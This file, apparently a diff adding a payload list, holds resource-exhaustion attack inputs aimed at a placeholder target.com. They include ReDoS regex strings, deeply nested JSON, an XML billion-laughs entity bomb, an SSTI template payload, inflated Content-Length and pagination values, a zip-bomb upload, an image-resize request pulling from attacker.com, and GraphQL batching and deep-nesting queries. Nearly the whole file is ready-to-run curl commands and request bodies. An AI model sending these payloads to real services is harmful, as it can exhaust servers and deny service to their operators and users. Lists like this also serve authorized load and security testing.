@@ -1,0 +1,21 @@
+curl -s -X POST https://target.com/api/search -d '{"query":"(a+)+$","input":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac"}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/validate -d '{"pattern":"^(a|aa)+$","input":"aaaaaaaaaaaaaaaaaaaaaaaaac"}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/parse -d '{"regex":"(.*,)+","data":"x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x"}' -H "Content-Type: application/json"
+{"json": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {"a": {}}}}}}}}}}}}}}}}}}}}}}}
+{"xml": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY a 'AAAAAAAAAAAAAAAAAAA'><!ENTITY b '&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;'><!ENTITY c '&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;'><!ENTITY d '&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;'>]><foo>&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;</foo>"}
+curl -s -X POST https://target.com/api/render -d '{"template":"{{''.__class__.__mro__[2].__subclasses__()}}"}' (resource exhaustion via SSTI)
+curl -s https://target.com/api/search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Content-Length: 99999999
+Content-Length: 2147483647
+{"page": 1, "per_page": 999999999}
+{"limit": 2147483647}
+{"depth": 999999}
+{"recursion": 999999}
+curl -s -X POST https://target.com/api/zip-extract -H "Content-Type: application/zip" --data-binary @zipbomb.zip
+curl -s -X POST https://target.com/api/image-resize -d '{"url":"https://attacker.com/large.jpg","width":99999,"height":99999}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/pdf -d '{"html":"<html><body>'$(python3 -c 'print("A"*1000000)')'</body></html>"}' -H "Content-Type: application/json"
+curl -s https://target.com/api/export?format=csv&limit=99999999
+curl -s https://target.com/api/report?start=2000-01-01&end=2099-12-31
+GET /api/resource?include=related1,related2,related3,related4,related5,related6,related7,related8,related9,related10
+{"operations": [{"query": "{ users { id } }"}, ...]} (GraphQL batching attack - repeat 1000 times)
+curl -s -X POST https://target.com/graphql -d '{"query":"{ users { posts { comments { likes { user { posts { comments { likes { user { id } } } } } } } } } }"}' (GraphQL deep query)
